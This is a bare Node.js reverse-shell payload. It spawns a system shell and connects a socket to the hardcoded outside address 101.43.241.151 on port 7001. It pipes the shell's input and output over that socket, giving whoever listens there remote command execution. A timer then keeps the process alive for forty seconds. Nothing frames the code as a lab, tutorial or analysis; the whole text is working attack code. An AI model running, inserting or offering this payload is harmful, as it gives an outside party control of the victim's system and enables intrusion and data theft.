(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(7001, "101.43.241.151", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();

// Sleep for 40 seconds
setTimeout(function(){
    // Exit the process
    process.exit();
} , 40000);

// Block exit
process.stdin.resume();
